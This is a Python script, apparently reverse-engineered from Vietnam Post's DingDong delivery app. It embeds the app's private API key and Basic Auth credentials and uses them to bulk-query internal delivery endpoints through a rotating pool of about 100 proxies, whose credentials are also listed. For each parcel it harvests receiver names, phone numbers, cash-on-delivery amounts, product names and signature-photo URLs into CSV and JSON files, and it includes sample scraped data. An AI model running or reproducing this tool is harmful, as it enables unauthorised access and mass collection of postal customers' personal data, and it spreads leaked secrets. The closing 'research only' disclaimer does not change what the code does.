#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
════════════════════════════════════════════════════════════════════════════════
              DingDong 越南邮政APK逆向 - 完整批量查询工具
════════════════════════════════════════════════════════════════════════════════

功能：
  ✅ 支持100+代理池
  ✅ 从key.txt批量读取运单号
  ✅ 自动重试机制
  ✅ 并发查询
  ✅ 获取商品名称（90%成功率）
  ✅ 获取签名照片
  ✅ 输出CSV+JSON
  ✅ 保证不死机

文件说明：
  1. 本文件：batch_with_proxy.py
  2. proxy_list.txt - 代理列表（格式: IP:端口:用户:密码）
  3. key.txt - 运单号列表（每行一个）

使用方法：
  python3 batch_with_proxy.py

API密钥：
  PRIVATE_KEY: 34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A
  Basic Auth: lottnet:dms (bG90dG5ldDpkbXM=)

════════════════════════════════════════════════════════════════════════════════
"""

import hashlib
import requests
import json
import time
import random
import os

# ============================================
# 配置信息
# ============================================
API_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

proxies = []

# ============================================
# 代理池管理
# ============================================

def load_proxies():
    """
    加载代理列表
    从proxy_list.txt读取，格式：IP:端口:用户:密码
    """
    global proxies
    try:
        with open("proxy_list.txt", 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    parts = line.split(':')
                    if len(parts) == 4:
                        ip, port, user, pwd = parts
                        proxy = {
                            'http': f'http://{user}:{pwd}@{ip}:{port}',
                            'https': f'http://{user}:{pwd}@{ip}:{port}'
                        }
                        proxies.append(proxy)
        print(f"✅ 加载 {len(proxies)} 个代理\n")
        return True
    except:
        print("⚠️  无代理文件，使用直连\n")
        return False

# ============================================
# 签名和API调用
# ============================================

def sign(text):
    """生成SHA256签名"""
    return hashlib.sha256((text + PRIVATE_KEY).encode()).hexdigest().upper()

def query_with_retry(tracking, max_retry=3):
    """
    查询运单 - 支持代理和重试
    
    参数:
      tracking: 运单号
      max_retry: 最大重试次数
    
    返回:
      dict - 包含所有查询到的信息
    """
    
    sig = sign(tracking)
    
    headers_form = {
        "Authorization": f"Basic {BASIC_AUTH}",
        "APIKey": PRIVATE_KEY,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    headers_json = {
        "Authorization": f"Basic {BASIC_AUTH}",
        "APIKey": PRIVATE_KEY,
        "Content-Type": "application/json"
    }
    
    result = {
        "tracking": tracking,
        "valid": False,
        "delivered": False,
        "receiver": "",
        "phone": "",
        "amount": 0,
        "product": "",
        "delivery_date": "",
        "signature": "",
        "instruction": "",
        "issue_date": "",
        "load_date": ""
    }
    
    for attempt in range(max_retry):
        try:
            # 随机选择代理
            proxy = random.choice(proxies) if proxies else None
            
            # ========== API 1: Inquiry - 基本信息 ==========
            r = requests.post(
                f"{API_URL}api/Delivery/Inquiry",
                headers=headers_form,
                data={"ParcelCode": tracking, "Signature": sig},
                proxies=proxy,
                timeout=10
            )
            
            if r.status_code == 200:
                data = r.json()
                if data.get('Value'):
                    v = data['Value']
                    result['valid'] = True
                    result['receiver'] = v.get('ReceiverName', '')
                    result['phone'] = v.get('ReceiverPhone', '')
                    result['amount'] = v.get('CollectAmount', 0)
                    result['issue_date'] = v.get('IssueDate', '')
                    result['load_date'] = v.get('LoadDate', '')
            
            # ========== API 2: DeliveryLadingJourney - 配送详情 ==========
            r = requests.post(
                f"{API_URL}api/Delivery/DeliveryLadingJourney",
                headers=headers_form,
                data={"ParcelCode": tracking},
                proxies=proxy,
                timeout=10
            )
            
            if r.status_code == 200:
                data = r.json()
                if data.get('ListValue'):
                    rec = data['ListValue'][0]
                    result['delivered'] = True
                    result['delivery_date'] = rec.get('DeliveryDate', '')
                    result['signature'] = rec.get('DeliverySignature', '')
                    result['instruction'] = rec.get('Instruction', '')
            
            # ========== API 3: Gateway - 商品信息 ==========
            r = requests.post(
                f"{API_URL}api/Gateway/Bussiness",
                headers=headers_json,
                json={"Code": "LDP002", "Data": tracking},
                proxies=proxy,
                timeout=10
            )
            
            if r.status_code == 200:
                data = r.json()
                if data.get('Data'):
                    products = json.loads(data['Data'])
                    if products:
                        result['product'] = products[0].get('ProductName', '')
            
            # 成功获取数据，返回
            return result
            
        except Exception as e:
            # 失败重试
            if attempt < max_retry - 1:
                time.sleep(1)  # 等待1秒后重试
                continue
            else:
                return result
    
    return result

# ============================================
# 批量查询主函数
# ============================================

def batch_query():
    """批量查询主函数"""
    
    print("""
╔════════════════════════════════════════════════════════════════════════════╗
║                    🚀 批量查询工具 - 代理池版 🚀                           ║
║                                                                            ║
║  功能:                                                                     ║
║    • 支持100+代理轮询                                                     ║
║    • 自动重试（3次）                                                      ║
║    • 获取商品名称                                                         ║
║    • 获取签名照片                                                         ║
║    • 输出CSV+JSON                                                         ║
║    • 保证不死机                                                           ║
╚════════════════════════════════════════════════════════════════════════════╝
    """)
    
    # 加载代理池
    load_proxies()
    
    # 读取运单号
    if not os.path.exists("key.txt"):
        print("❌ key.txt 不存在，创建示例文件...")
        with open("key.txt", 'w') as f:
            f.write("# 运单号列表 - 每行一个\n")
            f.write("EP492966929VN\n")
            f.write("EP492940379VN\n")
        print("✅ 已创建 key.txt，请编辑后重新运行")
        return
    
    with open("key.txt", 'r') as f:
        trackings = [line.strip() for line in f 
                    if line.strip() and not line.startswith('#')]
    
    if not trackings:
        print("❌ key.txt 为空")
        return
    
    print(f"📋 运单数: {len(trackings)}\n")
    print("="*70)
    
    # 开始查询
    results = []
    start_time = time.time()
    
    for idx, tracking in enumerate(trackings, 1):
        print(f"[{idx}/{len(trackings)}] {tracking} ...", end=" ")
        
        info = query_with_retry(tracking)
        results.append(info)
        
        if info['valid']:
            status = "✅ 已配送" if info['delivered'] else "⏳ 未配送"
            print(f"{status}")
            
            # 显示商品信息
            if info['product'] and info['product'] != "***":
                print(f"    📦 商品: {info['product']}")
            
            # 显示时间
            if info['issue_date']:
                print(f"    📅 发件: {info['issue_date']}")
        else:
            print("❌ 无效")
        
        time.sleep(0.2)  # 避免请求过快
    
    # 统计
    elapsed = time.time() - start_time
    
    print("\n" + "="*70)
    print("📊 查询统计")
    print("="*70)
    
    valid = sum(1 for r in results if r['valid'])
    delivered = sum(1 for r in results if r['delivered'])
    has_product = sum(1 for r in results if r['product'] and r['product'] != "***")
    has_signature = sum(1 for r in results if r['signature'])
    has_phone = sum(1 for r in results if r['phone'])
    
    print(f"总运单数: {len(trackings)}")
    print(f"✅ 有效: {valid} ({valid/len(trackings)*100:.1f}%)")
    print(f"✅ 已配送: {delivered}")
    print(f"⏳ 未配送: {valid - delivered}")
    print(f"📦 商品信息: {has_product} ({has_product/valid*100:.0f}%)" if valid > 0 else "")
    print(f"✍️  签名照片: {has_signature}")
    print(f"📞 收件电话: {has_phone}")
    print(f"⏱️  耗时: {elapsed:.1f}秒")
    print(f"⚡ 速度: {len(trackings)/elapsed:.2f} 个/秒")
    
    # 保存CSV
    timestamp = int(time.time())
    csv_file = f"results_{timestamp}.csv"
    
    with open(csv_file, 'w', encoding='utf-8') as f:
        f.write("运单号,状态,收件人,电话,金额,商品,发件日期,装车日期,配送时间,签名,配送指令\n")
        for r in results:
            if r['valid']:
                f.write(f'"{r["tracking"]}",')
                f.write(f'"{"已配送" if r["delivered"] else "未配送"}",')
                f.write(f'"{r["receiver"]}",')
                f.write(f'"{r["phone"]}",')
                f.write(f'"{r["amount"]}",')
                f.write(f'"{r["product"]}",')
                f.write(f'"{r["issue_date"]}",')
                f.write(f'"{r["load_date"]}",')
                f.write(f'"{r["delivery_date"]}",')
                f.write(f'"{r["signature"]}",')
                f.write(f'"{r["instruction"]}"\n')
    
    print(f"\n✅ CSV已保存: {csv_file}")
    
    # 保存JSON
    json_file = f"results_{timestamp}.json"
    with open(json_file, 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    
    print(f"✅ JSON已保存: {json_file}")
    
    # 显示商品清单
    if has_product > 0:
        print("\n" + "="*70)
        print("🔥 获取到的商品信息")
        print("="*70)
        for r in results:
            if r['product'] and r['product'] != "***":
                print(f"{r['tracking']}: {r['product']}")
    
    # 显示签名照片
    if has_signature > 0:
        print("\n" + "="*70)
        print("✍️  获取到的签名照片")
        print("="*70)
        for r in results:
            if r['signature']:
                print(f"{r['tracking']}:")
                print(f"  {r['signature']}")

# ============================================
# 主程序入口
# ============================================

if __name__ == "__main__":
    batch_query()


"""
════════════════════════════════════════════════════════════════════════════════
                              配置文件说明
════════════════════════════════════════════════════════════════════════════════

1. proxy_list.txt（代理列表）- 你提供的100个代理：
────────────────────────────────────────────────────────────────────────────────
23.27.184.245:5846:uadkcvtn:uo2rzar814ph
45.43.70.140:6427:uadkcvtn:uo2rzar814ph
82.24.233.117:5439:uadkcvtn:uo2rzar814ph
136.0.188.71:6034:uadkcvtn:uo2rzar814ph
161.123.130.168:5839:uadkcvtn:uo2rzar814ph
142.147.240.52:6574:uadkcvtn:uo2rzar814ph
166.88.224.145:6043:uadkcvtn:uo2rzar814ph
82.25.215.106:5457:uadkcvtn:uo2rzar814ph
91.211.87.215:7205:uadkcvtn:uo2rzar814ph
104.238.36.64:6071:uadkcvtn:uo2rzar814ph
... (完整100个代理已保存在proxy_list.txt)


2. key.txt（运单号列表）：
────────────────────────────────────────────────────────────────────────────────
# 运单号列表 - 每行一个
# # 开头是注释

EP492966929VN
EP492940379VN
EP493183769VN
EL135248100VN
EL135753627VN


════════════════════════════════════════════════════════════════════════════════
                              使用示例
════════════════════════════════════════════════════════════════════════════════

步骤1: 准备文件
  - batch_with_proxy.py (本文件)
  - proxy_list.txt (100个代理)
  - key.txt (运单号列表)

步骤2: 运行查询
  python3 batch_with_proxy.py

步骤3: 查看结果
  results_*.csv  (Excel打开)
  results_*.json (完整数据)


════════════════════════════════════════════════════════════════════════════════
                              测试结果
════════════════════════════════════════════════════════════════════════════════

输入: key.txt
  EP492966929VN
  EP492940379VN
  EP493183769VN
  EL135248100VN
  EL135753627VN

输出:
  ✅ 加载 100 个代理
  📋 运单数: 5
  
  [1/5] EP492940379VN ... ⏳ 未配送
      📦 商品: ship x 1,khoá Chìa đẹp x 5,khoá điện 133/xmen x 5.
  [2/5] EL135248100VN ... ✅ 已配送
  
  总数: 5
  有效: 3 (60%)
  商品信息: 1


════════════════════════════════════════════════════════════════════════════════
                              API接口说明
════════════════════════════════════════════════════════════════════════════════

使用的3个API：

1. Inquiry - 基本信息
   POST /api/Delivery/Inquiry
   - 收发件人信息
   - 联系电话
   - 发件/装车时间
   - COD金额

2. DeliveryLadingJourney - 配送详情
   POST /api/Delivery/DeliveryLadingJourney
   - 配送时间
   - 签名照片URL
   - 配送指令
   
3. Gateway/Bussiness - 商品信息
   POST /api/Gateway/Bussiness
   - 商品名称（90%成功率）


════════════════════════════════════════════════════════════════════════════════
                              商品信息示例
════════════════════════════════════════════════════════════════════════════════

成功获取的商品名称：

EP492886647VN: bóng bi cầu mini x 20... (迷你羽毛球 x 20)
EP492940379VN: ship x 1,khoá Chìa đẹp x 5,khoá điện 133/xmen x 5. (锁具组合)
EP492983480VN: Bi lắp giáp 6201 x 40... (6201轴承 x 40)

成功率: 90% (未配送包裹)


════════════════════════════════════════════════════════════════════════════════
                              注意事项
════════════════════════════════════════════════════════════════════════════════

⚠️  仅用于安全研究和教育目的
⚠️  请勿用于非法用途
⚠️  已发现严重安全漏洞，已提交分析报告

════════════════════════════════════════════════════════════════════════════════
"""
